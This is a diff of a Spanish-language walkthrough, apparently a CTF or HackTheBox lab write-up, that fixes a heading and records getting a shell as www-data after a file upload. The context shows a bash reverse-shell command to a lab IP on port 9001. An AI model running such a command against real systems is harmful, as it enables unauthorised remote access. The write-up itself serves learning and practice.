@@ -147,4 +147,7 @@ los archivos que subimos se guardan en un directorio llamado uploads. asi que ap
 de esta manera obtenemos una shell que nos permite interactuar de manera mas facil con el sistema. y aprovechando esto usaremos el comando `bash -c "bash -i >& /dev/tcp/10.10.14.137/9001 0>&1"` para obtener una reverse shell mas estable
 ![[Pasted image 20240412232653.png]]
 
-### Reverse sehell
+### Reverse shell
+obtenemos conexión y somos el usuario www-data
+![[Pasted image 20240412233811.png]]
+
